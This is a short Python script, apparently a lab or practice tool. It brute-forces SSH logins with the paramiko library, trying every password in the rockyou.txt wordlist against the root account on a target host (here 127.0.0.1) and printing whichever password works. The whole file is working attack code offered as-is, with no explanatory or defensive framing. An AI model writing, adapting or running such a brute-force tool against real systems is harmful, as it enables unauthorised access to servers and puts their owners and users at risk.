import paramiko
import sys
import os


target= "127.0.0.1"
username = "root"
with open("rockyou.txt" , "r") as word:
    wordlist = word.read()
    wordlist = wordlist.splitlines()

def ssh_connect(password,code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target , port=22 , username=username , password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

for passwd in wordlist:
    password = passwd.strip()

    try :
        respond = ssh_connect(password)
        if respond == 0:
            print(f"password was found : {password}")
            exit(0)
        elif respond == 1:
            print("....")
    except Exception as e:
        print(e)
    pass







